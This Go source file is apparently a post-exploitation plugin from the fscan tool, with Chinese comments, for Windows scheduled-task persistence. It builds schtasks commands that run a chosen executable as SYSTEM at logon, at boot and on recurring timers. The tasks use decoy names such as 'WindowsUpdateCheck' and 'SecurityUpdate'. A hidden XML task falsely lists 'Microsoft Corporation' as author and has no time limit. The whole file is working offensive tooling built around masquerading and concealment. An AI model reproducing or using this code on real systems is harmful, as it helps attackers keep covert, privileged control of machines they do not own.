//go:build (plugin_winschtask || !plugin_selective) && windows && !no_local

package local

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

// WinSchTaskPlugin Windows计划任务持久化插件
// 设计哲学：直接实现，删除过度设计
// - 删除复杂的继承体系
// - 直接实现计划任务持久化功能
// - 保持原有功能逻辑
type WinSchTaskPlugin struct {
	plugins.BasePlugin
}

// NewWinSchTaskPlugin 创建Windows计划任务持久化插件
func NewWinSchTaskPlugin() *WinSchTaskPlugin {

	return &WinSchTaskPlugin{
		BasePlugin: plugins.NewBasePlugin("winschtask"),
	}
}

// Scan 执行Windows计划任务持久化 - 直接实现
func (p *WinSchTaskPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	config := session.Config
	state := session.State
	var output strings.Builder

	// 从config获取配置
	pePath := config.WinPEFile
	

	if runtime.GOOS != "windows" {
		output.WriteString("Windows计划任务持久化只支持Windows平台\n")
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   fmt.Errorf("不支持的平台: %s", runtime.GOOS),
		}
	}

	if pePath == "" {
		output.WriteString("必须通过 -win-pe 参数指定PE文件路径\n")
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   fmt.Errorf("未指定PE文件"),
		}
	}

	// 检查目标文件是否存在
	if _, err := os.Stat(pePath); os.IsNotExist(err) {
		output.WriteString(fmt.Sprintf("PE文件不存在: %s\n", pePath))
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   err,
		}
	}

	// 检查文件类型
	if !p.isValidPEFile(pePath) {
		output.WriteString(fmt.Sprintf("目标文件必须是PE文件(.exe或.dll): %s\n", pePath))
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   fmt.Errorf("无效的PE文件"),
		}
	}

	output.WriteString("=== Windows计划任务持久化 ===\n")
	output.WriteString(fmt.Sprintf("PE文件: %s\n", pePath))
	output.WriteString(fmt.Sprintf("平台: %s\n\n", runtime.GOOS))

	// 创建计划任务持久化
	scheduledTasks, err := p.createScheduledTaskPersistence(pePath)
	if err != nil {
		output.WriteString(fmt.Sprintf("创建计划任务持久化失败: %v\n", err))
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   err,
		}
	}

	output.WriteString(fmt.Sprintf("创建了%d个计划任务持久化项:\n", len(scheduledTasks)))
	for i, task := range scheduledTasks {
		output.WriteString(fmt.Sprintf("  %d. %s\n", i+1, task))
	}
	output.WriteString("\n✓ Windows计划任务持久化完成\n")

	common.LogSuccess(i18n.Tr("winschtask_success", len(scheduledTasks)))

	return &plugins.Result{
		Success: true,
		Type:    plugins.ResultTypeService,
		Output:  output.String(),
		Error:   nil,
	}
}

// createScheduledTaskPersistence 创建计划任务持久化
func (p *WinSchTaskPlugin) createScheduledTaskPersistence(pePath string) ([]string, error) {
	absPath, err := filepath.Abs(pePath)
	if err != nil {
		return nil, fmt.Errorf("failed to get absolute path: %w", err)
	}

	var scheduledTasks []string
	baseName := filepath.Base(absPath)
	baseNameNoExt := baseName[:len(baseName)-len(filepath.Ext(baseName))]

	tasks := []struct {
		name        string
		schedule    string
		description string
		modifier    string
	}{
		{
			name:        fmt.Sprintf("WindowsUpdateCheck_%s", baseNameNoExt),
			schedule:    "DAILY",
			modifier:    "1",
			description: "Daily Windows Update Check",
		},
		{
			name:        fmt.Sprintf("SystemSecurityScan_%s", baseNameNoExt),
			schedule:    "ONLOGON",
			modifier:    "",
			description: "System Security Scan on Logon",
		},
		{
			name:        fmt.Sprintf("NetworkMonitor_%s", baseNameNoExt),
			schedule:    "MINUTE",
			modifier:    "30",
			description: "Network Monitor Every 30 Minutes",
		},
		{
			name:        fmt.Sprintf("MaintenanceTask_%s", baseNameNoExt),
			schedule:    "ONSTART",
			modifier:    "",
			description: "System Maintenance Task on Startup",
		},
		{
			name:        fmt.Sprintf("BackgroundService_%s", baseNameNoExt),
			schedule:    "HOURLY",
			modifier:    "2",
			description: "Background Service Every 2 Hours",
		},
		{
			name:        fmt.Sprintf("SecurityUpdate_%s", baseNameNoExt),
			schedule:    "ONIDLE",
			modifier:    "5",
			description: "Security Update When System Idle",
		},
	}

	for _, task := range tasks {
		var schTaskCmd string

		if task.modifier != "" {
			schTaskCmd = fmt.Sprintf(`schtasks /create /tn "%s" /tr "\"%s\"" /sc %s /mo %s /ru "SYSTEM" /f`,
				task.name, absPath, task.schedule, task.modifier)
		} else {
			schTaskCmd = fmt.Sprintf(`schtasks /create /tn "%s" /tr "\"%s\"" /sc %s /ru "SYSTEM" /f`,
				task.name, absPath, task.schedule)
		}

		scheduledTasks = append(scheduledTasks, fmt.Sprintf("[%s] %s", task.description, schTaskCmd))
	}

	xmlTemplate := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-01-01T00:00:00</Date>
    <Author>Microsoft Corporation</Author>
    <Description>Windows System Service</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>%s</Command>
    </Exec>
  </Actions>
</Task>`, absPath)

	xmlTaskName := fmt.Sprintf("WindowsSystemService_%s", baseNameNoExt)
	xmlPath := fmt.Sprintf(`%%TEMP%%\%s.xml`, xmlTaskName)

	xmlCmd := fmt.Sprintf(`echo %s > "%s" && schtasks /create /xml "%s" /tn "%s" /f`,
		xmlTemplate, xmlPath, xmlPath, xmlTaskName)

	scheduledTasks = append(scheduledTasks, fmt.Sprintf("[XML Task Import] %s", xmlCmd))

	return scheduledTasks, nil
}

// isValidPEFile 检查是否为有效的PE文件
func (p *WinSchTaskPlugin) isValidPEFile(filePath string) bool {
	ext := strings.ToLower(filepath.Ext(filePath))
	return ext == ".exe" || ext == ".dll"
}

// 注册插件
func init() {
	RegisterLocalPlugin("winschtask", func() Plugin {
		return NewWinSchTaskPlugin()
	})
}
